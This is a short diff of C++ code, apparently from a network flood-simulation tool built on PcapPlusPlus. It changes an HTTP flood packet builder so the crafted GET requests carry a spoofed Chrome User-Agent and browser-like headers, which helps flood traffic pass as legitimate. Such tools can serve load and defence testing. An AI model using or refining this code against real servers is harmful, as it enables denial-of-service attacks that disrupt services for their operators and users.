@@ -90,14 +90,20 @@ void simulateFlood(const std::function<pcpp::Packet()>& packetBuilder,pcpp::Pcap
     //HTTP flood packet builder
     pcpp::Packet buildHTTPPacket(const pcpp::MacAddress* srcMac, const pcpp::MacAddress* dstMac,
                                  const pcpp::IPv4Address* srcIP, const pcpp::IPv4Address* dstIP){
-        pcpp::Packet packet(200);
+        pcpp::Packet packet(300);
         auto* ethLayer = new pcpp::EthLayer(*srcMac,*dstMac);
         auto* iPv4Layer = new pcpp::IPv4Layer(*srcIP,*dstIP);
         auto* tcpLayer = new pcpp::TcpLayer(12345,80);
         tcpLayer->getTcpHeader()->pshFlag=1;
         tcpLayer->getTcpHeader()->ackFlag=1;
 
-        std::string httpRequest = "GET / HTTP/1.1\r\nHost: " + (*dstIP).toString() +"\r\n\r\n";
+        std::string httpRequest =
+                "GET / HTTP/1.1\r\n"
+                "Host: " + (*dstIP).toString() + "\r\n"+
+                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n"+
+                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n"+
+                "Accept-Language: en-US,en;q=0.5\r\n"+
+                "Connection: keep-alive\r\n\r\n";
         auto* payloadLayer = new pcpp::PayloadLayer((uint8_t*)httpRequest.c_str(),httpRequest.size(),tcpLayer,&packet);
 
         packet.addLayer(ethLayer);
